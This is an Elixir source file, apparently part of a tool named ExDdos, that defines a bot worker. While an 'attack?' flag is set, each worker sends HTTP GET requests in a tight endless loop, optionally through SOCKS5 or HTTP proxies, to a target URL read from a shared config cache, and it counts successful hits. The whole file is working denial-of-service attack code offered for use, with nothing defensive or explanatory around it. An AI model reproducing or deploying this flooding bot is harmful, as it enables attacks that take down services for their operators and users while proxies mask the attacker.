defmodule ExDdos.Bot do
  use GenServer, restart: :transient

  require Logger

  def start_link(args), do: GenServer.start_link(__MODULE__, args)

  @impl true
  def init(args) do
    loop()
    {:ok, [hackney: [pool: :big_pool], proxy: proxy_opts(args)]}
  end

  defp proxy_opts(scheme: "socks5", host: host, port: port), do: {:socks5, host, port}

  defp proxy_opts(host: host, port: port), do: {host, port}

  defp proxy_opts(_), do: nil

  @impl true
  def handle_info(:loop, request_opts) do
    with {:attack?, true} <- {:attack?, Cachex.get!(:config_store, "attack?")},
         url = Cachex.get!(:config_store, "url"),
         {:url, true} <- {:url, not is_nil(url)},
         {:ok, response} <- HTTPoison.get(url, %{}, request_opts) do
      Logger.info("status code - #{response.status_code}")
      Cachex.incr(:counts, "success_req_count", 1)
      loop()
      {:noreply, request_opts}
    else
      {:attack?, _} ->
        loop()
        {:noreply, request_opts}

      {:url, false} ->
        Logger.warning("misconfig")
        exit(:normal)

      {:error, %HTTPoison.Error{} = err} ->
        Logger.warning("can't make request - #{inspect(err)}")
        exit(:normal)

      unexpected_res ->
        Logger.error("unexpected_res - #{inspect(unexpected_res)}")
        exit(:normal)
    end
  end

  defp loop, do: Process.send(self(), :loop, [])
end
